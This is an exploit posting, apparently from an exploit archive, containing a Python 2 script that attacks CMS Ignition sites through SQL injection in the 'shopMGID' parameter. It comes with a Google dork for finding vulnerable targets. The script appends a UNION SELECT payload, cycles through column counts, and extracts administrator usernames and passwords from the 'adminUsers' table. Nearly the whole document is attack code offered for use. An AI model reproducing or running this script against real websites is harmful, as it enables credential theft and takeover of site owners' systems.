 
# Exploit Title:    CMS Ignition SQL Injection
# Date:         25/08/2010  [DD:MM:JJJJ]
# Author:       NEAVORC
# Software Link:    http://www.finegrafix.co.za/
#           http://www.finegrafix.co.za/cmsignition.htm
# Dork:         Dorks: allinurl:"shop.htm?shopMGID="   
 
import urllib ,sys,os
if len(sys.argv)!=2:
    os.system('cls')
    os.system('clear')
    print "==============================================================================="
    print "==============   CMSignition Exploit  ||| NEAVORC[@]gmail[.]com ==============="
    print "==============================================================================="
    print "== Take the Admin username and the password from the tagrt page              =="
    print "=Usage: ./exploit.py <injection>                                             =="
    print "=Exmpl: ./exploit.py <http://www.site.com/shop.htm?shopMGID=131>  =="
    print "==============================================================================="
    sys.exit(1)
global url,end,injection,i 
url = sys.argv[1]
url = url.replace("=","=-")
end = "+from+adminUsers--"
injection = "+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,concat_ws(0x3a,0x6F7574707574,username,password,0x6861636B6564),22,23,24,25,26,27,28,29,"
os.system('cls')
print "==============================================================================="
print "=================   SQLi   Exploit  ||| NEAVORC[@]gmail[.]com ================="
print "==============================================================================="
print "==                         Exploiting Please wait...                         =="
print "==============================================================================="
 
if url[:7] != "http://":
    print "Url correction...."
    url = "http://"+url
    print "To : "+url
try:
    i = 30
    while i <=70:
        global full_inj
        injection = injection+str(i)+","
        full_inj = url+injection[:-1]+end
        f = urllib.urlopen(full_inj)
        s = f.read()
        if "output:" in s:
            begin = int(s.find("output"))
            end = int(s.find("hacked"))
            columns = full_inj[-20:-18]
            os.system('cls')
            print "==============================================================================="
            print "=================   SQLi   Exploit  ||| NEAVORC[@]gmail[.]com ================="
            print "==============================================================================="    
            print "=================   Administrator: "+s[begin:end-1]
            print "=================   Columns: "+columns
            print "==============================================================================="
            print "==============             Exploit by NEAVORC[at]gmail.com          ==========="
        i = i+1
except(TypeError):
    exit